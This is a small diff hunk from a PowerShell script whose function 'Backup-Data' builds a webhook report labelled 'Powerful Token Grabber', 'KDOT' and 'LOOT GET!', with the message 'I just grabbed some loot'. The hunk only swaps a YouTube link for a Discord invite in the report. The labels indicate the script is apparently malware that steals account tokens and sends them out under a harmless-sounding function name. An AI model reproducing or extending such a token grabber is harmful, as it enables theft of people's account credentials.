@@ -662,9 +662,9 @@ function Backup-Data {
         "username" = "POWER"
         "content" = "Haiii I just grabbed some loot :3"
         "title" = "KDOT"
-	"url" = "https://www.youtube.com/watch?v=t8KqCp76qqQ"
         "description" = "Powerful Token Grabber"
         "color" = "3447003"
+	"url" = "https://discord.gg/vk3rBhcj2y"
         "embeds" = @(
             @{
                 "title" = "LOOT GET!"
